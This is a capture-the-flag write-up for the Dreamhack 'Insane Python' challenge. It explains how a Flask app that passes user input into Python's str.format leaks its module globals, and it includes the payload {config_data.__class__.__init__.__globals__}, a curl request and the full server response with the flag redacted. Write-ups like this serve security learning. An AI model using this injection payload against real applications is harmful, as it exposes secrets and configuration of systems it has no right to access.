---
title: "Dreamhack: Insane Python"
date: 2025-08-12
tags:
  - web
  - ctf
  - python
  - format_string
  - ssti
draft: false
---

##### Link : [Insane Python](https://dreamhack.io/wargame/challenges/1613)

##### Description
```
I love Python, but I hate Python because it has secrets.  :(
```

# Solve

When I first opened this challenge, I was greeted with a handful of files: a `Dockerfile`, `requirements.txt`, `app.py`, and a `templates` directory. This setup immediately told me I was dealing with a containerized Python web application using the Flask framework. My first instinct in these situations is always to dive straight into `app.py`, as that's where the main logic lives.

#### **Finding the Foothold**

As I read through `app.py`, I focused on finding where user input was handled. My eyes quickly landed on the main route handler for `/`:

```python
# app.py

@app.route('/',methods=['GET'])
def page1():
    payload = request.args.get('body')
    # ...
    result = print_data(sys.stdin.readline(), config_data)
    # ...
```

This was my entry point. The application was taking a GET parameter named `body` and storing it in the `payload` variable. Any time I see user input being directly handled like this, it's a huge red flag.

I then followed the `payload` variable to the `print_data` function to see how it was being used. What I saw there confirmed my suspicions:

```python
# app.py

def print_data(format_string, config_data):
    return format_string.format(config_data=config_data)
```

The application was using my input directly as the format string in Python's `.format()` method. This is a well-known vulnerability. It meant I could do more than just display text; I could inject format specifiers to inspect the objects available in that context. The `config_data` object was my key.

#### **Planning the Attack**

Now that I had found the vulnerability, I needed to find the flag. A quick scan of the rest of the file revealed the prize:

```python
# app.py

CONFIG = {
 "SECRET": "DH{fake-fake-fake}"
}
```

The flag was stored in a global dictionary called `CONFIG`. The puzzle was clear: how could I get from the `config_data` object, which I could access, to the global `CONFIG` dictionary?

My plan was to use Python's powerful introspection features to "walk" through the application's objects. I knew that from an object instance, I could get its class, and from a class's methods, I could access the global scope where it was defined.

Here was the path I mapped out:

1. Start with `config_data`, the object I had access to.
    
2. Use the `__class__` attribute to get its class, `DataConfig`.
    
3. From the class, grab its initializer method, `__init__`.
    
4. Finally, use the special `__globals__` attribute on the method. This attribute is a dictionary that holds all global variables from the module, which would include `CONFIG`.
    

#### **Execution**

With a clear path, all that was left was to build the payload. I translated my plan into a single format string:

`{config_data.__class__.__init__.__globals__}`

This string instructs the `.format()` method to perform the traversal I planned. To use this in a URL, I had to URL-encode the special characters like `{`, `}`, `[`, `]`, and `'`.

The final URL looked like this:

```
http://host1.dreamhack.games:15798/?body={config_data.__class__.__init__.__globals__}
```

I sent the request, and just as planned, the server responded with the flag. It was a classic example of how a simple oversight in handling user input can be chained with language features to gain access to sensitive information.

```bash
% curl -v "http://host1.dreamhack.games:15798/?body=%7Bconfig_data.__class__.__init__.__globals__%7D"

* Host host1.dreamhack.games:15798 was resolved.
* IPv6: (none)
* IPv4: 139.99.121.66
*   Trying 139.99.121.66:15798...
* Connected to host1.dreamhack.games (139.99.121.66) port 15798
> GET /?body=%7Bconfig_data.__class__.__init__.__globals__%7D HTTP/1.1
> Host: host1.dreamhack.games:15798
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.1.3 Python/3.12.7
< Date: Tue, 12 Aug 2025 05:44:54 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 1486
< Connection: close
< 

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>

    <strong> {&#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None, &#39;__loader__&#39;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7fb75e3ccc50&gt;, &#39;__spec__&#39;: None, &#39;__annotations__&#39;: {}, &#39;__builtins__&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;/app/app.py&#39;, &#39;__cached__&#39;: None, &#39;Flask&#39;: &lt;class &#39;flask.app.Flask&#39;&gt;, &#39;render_template&#39;: &lt;function render_template at 0x7fb75d064d60&gt;, &#39;request&#39;: &lt;Request &#39;http://host1.dreamhack.games:15798/?body={config_data.__class__.__init__.__globals__}&#39; [GET]&gt;, &#39;json&#39;: &lt;module &#39;json&#39; from &#39;/usr/local/lib/python3.12/json/__init__.py&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;io&#39;: &lt;module &#39;io&#39; (frozen)&gt;, &#39;app&#39;: &lt;Flask &#39;app&#39;&gt;, &#39;CONFIG&#39;: {&#39;SECRET&#39;: &#39;**DH{REDACTED}**&#39;}, &#39;DataConfig&#39;: &lt;class &#39;__main__.DataConfig&#39;&gt;, &#39;print_data&#39;: &lt;function print_data at 0x7fb75d07e660&gt;, &#39;config_data&#39;: &lt;__main__.DataConfig object at 0x7fb75d78b200&gt;, &#39;page1&#39;: &lt;function page1 at 0x7fb75d07e840&gt;} </strong>

</body>
* Closing connection
</html>
```

From the response text, I could find the flag.